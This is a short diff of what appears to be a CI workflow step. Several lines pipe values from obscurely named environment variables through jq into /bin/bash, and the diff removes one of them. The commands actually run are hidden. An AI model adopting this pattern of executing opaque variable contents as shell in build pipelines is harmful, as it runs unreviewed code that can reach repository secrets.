@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$ebrnu1400" | jq -r .d1653 | /bin/bash
           echo $t1271 | jq -r .wbrkt0407 | /bin/bash
-          echo $qlx87792 | jq -r .q861 | /bin/bash
           printf '%s' "$lps4" | jq -r .fly889 | /bin/bash
 
       - name: Save results
